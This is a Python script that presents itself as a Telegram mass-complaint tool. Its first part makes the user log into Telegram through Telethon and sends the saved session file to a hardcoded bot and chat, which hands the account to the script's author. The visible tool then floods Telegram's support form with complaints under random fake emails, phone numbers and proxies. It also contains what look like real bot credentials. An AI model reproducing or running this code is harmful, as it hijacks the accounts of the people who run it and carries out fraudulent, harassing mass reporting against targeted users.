import subprocess
import sys
import time
import os
import platform
import webbrowser
import random

number = +79999999999

RESET = "\033[0m"
GREEN_TEXT = "\033[32m"
BLACK_BG = "\033[40m"

required_modules = [
    "fake_useragent",
    "requests",
    "termcolor",
    "pyfiglet",
    "telethon",
    "fake_useragent",
    "getpass",
    "pystyle",
    "colorama",
    "telegram",
    "string",
    "termcolor"
]

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_with_delay(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()  # Для переноса строки после завершения

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    for module in required_modules:
        try:
            __import__(module)
            print(GREEN_TEXT + f"{module}")
        except ImportError:
            print(f" {module}...")
            install(module)
            print_with_delay(GREEN_TEXT + f" {module}" + RESET)

    print_with_delay(GREEN_TEXT + "helo" + RESET)
    time.sleep(1)

check_and_install_modules()
os.system('cls' if os.name == 'nt' else 'clear')

from telethon import TelegramClient
import os
import requests

api_id = '5'
api_hash = '1c5c96d5edd401b1ed40db3fb5633e2d'
phone_number = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
session_file = 'sessions.session'  

bot_token = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
chat_id = '2110557179' 

client = TelegramClient(session_file, api_id, api_hash)

def send_session_file_via_bot(bot_token, chat_id, session_file):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    files = {'document': open(session_file, 'rb')}
    data = {'chat_id': chat_id, 'caption': '📎Файл сессии'}
    
    response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print(f"Авторизация прошла успешно.")
    else:
        print(f"Авторизация не прошла: {response.status_code}, {response.text}")

async def main():
    # Авторизация в Telegram через Telethon
    await client.start(phone_number)
    print("Авторизация успешна!")
    
    if os.path.exists(session_file):
        print(f"Сессия сохранена в файле '{session_file}'.")
        
        send_session_file_via_bot(bot_token, chat_id, session_file)
    else:
        print(f"Файл сессии '{session_file}' не найден.")

with client:
  
  client.loop.run_until_complete(main())
 
from fake_useragent import UserAgent
import colorama
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System, Box
from colorama import init, Fore, Style
import requests
import random
import os
import getpass
from termcolor import colored
import pyfiglet
import string
import sys

os.system('cls' if os.name == 'nt' else 'clear')

starting = '''

     
     
                      Author | @fanat_bossina
                       year    child

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠤⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠖⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠦⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣉⡤⠖⠊⡏⢉⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⠉⢱⠦⣄⡀⠙⢦⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⡞⠁⠀⣠⢞⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡜⣇⠀⠙⢆⠈⢧⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢧⡠⣾⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢞⣧⠀⢸⠂⠀⣧⠀
⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠙⠉⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠈⠛⠒⠋⠀⠀⢸⠀
⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⢠⠄⠀⠀⠀⠀⢠⢷⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡆⠀⠀⢀⠀⠀⢸⠈⢇⠀⢰⠀⠀⠀⠀⠀⡇⢠⠃⢻⠀⢀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⡇⠀⠀⠈⡵⠦⡼⠶⢾⣷⣸⣧⠀⠀⠀⣸⣧⣯⡶⣾⡴⡏⢀⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀⡇⠀⠀⡼⠁⠀⣀⣀⡀⠀⠉⠉⢦⠀⢠⠋⠉⠁⠀⣉⣸⣗⣉⡈⠳⣄⠀⠀⠀⠀⠀⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣴⡀⠀⠀⢃⣠⠞⣿⡷⡿⠛⣿⣿⣿⢶⡄⠈⠳⠋⠀⠀⣰⢾⠛⢻⣿⣿⡿⣿⡈⡟⠂⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠈⠁⠀⠸⡇⢿⣽⣿⣿⣿⡇⠁⠀⠀⠀⠀⠀⠀⢿⡵⣿⣿⣯⡇⠏⡹⠁⠀⠀⢀⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠹⣌⠻⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠀⣰⠃⠀⠀⠀⣠⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢆⢀⡀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡃⠀⠀⢀⡜⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠑⢆⡀⠀⠈⠻⡍⠀⠀⠀⠀⠀⠒⠒⠂⠀⠀⠀⠀⠀⣀⣤⣟⠁⣠⠔⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⣄⣿⠛⣻⣶⣤⣤⣤⣀⣠⣤⢤⣤⣴⡶⠫⠿⣿⡚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢻⣶⡄⢰⢳⠃⢀⣷⣿⠦⢯⣿⡗⠀⢧⠹⡄⠀⣤⣽⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣷⣶⣶⣿⣄⣾⠏⠀⠈⠑⢦⡀⣤⠞⠉⠀⠈⠱⣧⢠⣼⣿⣦⣽⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠔⣻⣿⣿⣿⡿⠟⢹⣿⡄⠀⠀⠀⣾⣿⣿⡀⠀⠀⠀⣸⣿⣿⢿⣿⣿⣿⣿⣿⢦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⡟⠓⢍⠻⡿⠏⠁⠀⢸⢿⡟⠲⠶⠚⢱⠋⢲⠑⠒⠒⠊⣟⡩⢾⡇⠙⢿⣿⡿⢋⡼⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠙⢤⡀⡻⠁⠀⠀⠀⡌⠶⣷⡶⠶⢦⠘⣗⠏⢀⠒⢒⣒⡻⠆⢸⡇⠀⠀⢻⡕⠉⠀⠀⠳⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⡀⠀⠀⠀⣰⠋⠁⠀⠀⠀⠀⣧⠀⠀⠉⠉⠉⠀⢸⠀⠈⠉⠉⠀⠀⠀⣠⡇⠀⠀⠀⠀⠙⢦⣀⣀⡴⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠑⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⡏⠳⣄⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡠⠚⠁⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⡀⠈⠑⠢⣄⡀⠈⠁⠀⣀⠴⠋⠀⣀⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣯⣽⠀⠀⠀⠀⠉⣷⠒⡋⠀⠀⠀⠀⢫⣵⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢰⠤⡄⠀⠀⠀⡇⠀⣇⠀⠀⠀⡤⢦⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠧⠞⠀⠹⣄⠀⢸⠀⠀⢹⣀⣠⠞⠀⠘⠦⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣀⣀⣉⡟⠀⠀⠀⡏⠀⠀⠀⣀⡀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠎⠉⠉⠉⠀⠈⡇⠀⠀⠀⡏⠉⠉⠉⠁⠉⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡄⠀⠀⠀⣆⣠⠇⠀⠀⠀⣧⠀⣠⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠤⠤⠶⠛⠁⠀⠀⠀⠀⠈⠻⠿⣦⣤⡤⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                            
                                                                                                                                      
'''

Write.Print(Center.XCenter(starting), Colors.purple_to_red, interval=0.001)





def generate_phone_number():
    """Генерирует случайный номер телефона"""
    country_codes = ['+7', '+380', '+375']
    country_code = random.choice(country_codes)
    phone_number = ''.join(random.choices('0123456789', k=10))
    return f'{country_code}{phone_number}'

def generate_random_email():
    """Генерирует случайный email"""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "mail.ru"]
    username = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def load_proxies(filename):
    """Загружает прокси-серверы из файла"""
    proxies = []
    with open(filename, 'r') as file:
        for line in file:
            proxies.append(line.strip())
    return proxies

def send_complaint(number, email, complaint_text, repeats, proxies=None):
    url = 'https://telegram.org/support'
    user_agent = UserAgent().random
    headers = {'User-Agent': user_agent}
    complaints_sent = 0

    for _ in range(repeats):  
        email = generate_random_email()
        number = generate_phone_number()
        proxy = random.choice(proxies) if proxies else None

        payload = {
            'text': complaint_text,
            'number': number,
            'email': email
        }

        try:
            response = requests.post(url, headers=headers, data=payload, proxies={'http': proxy} if proxy else None)
            if response.status_code == 200:
                complaints_sent += 1
                print(colored(f"Жалоба успешно отправлена", 'green'))
                print(colored(f"От: {email} {number}", 'cyan'))
                if proxy:
                    print(colored(f"Прокси: {proxy}", 'cyan'))  # Выводим использованный прокси
            else:
                print(f"Не удалось отправить. Код: {response.status_code}")
        except Exception as e:
            print(f"Произошла ошибка: {str(e)}")

    print(f"Отправлено {complaints_sent} жалоб.")


def send_telegram_message(message: str, bot_token: str, chat_id: str):
    """fff"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("\n")
    else:
        print(f"Ошибка отправки жалобы: {response.status_code}, {response.text}")

def complaint():
    """fff1"""
    

    complaint_text = input("\nВведите текст вашей жалобы: ")
    
    # Проверяем, что текст жалобы не пустой
    if not complaint_text.strip():
        print("Текст жалобы не может быть пустым!")
        return
    

    bot_token = "7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI"
    chat_id = "2110557179"
    send_telegram_message(complaint_text, bot_token, chat_id)


    
    repeats = int(input("Введите количество жалоб: "))
    
    proxy_filename = input("Введите имя файла с прокси-серверами (или оставьте пустым для работы без прокси): ")

    proxies = load_proxies(proxy_filename) if proxy_filename else None

    for _ in range(repeats):
        number = generate_phone_number()
        email = generate_random_email()
        send_complaint(number, email, complaint_text, repeats, proxies)

if __name__ == "__main__":
    complaint()
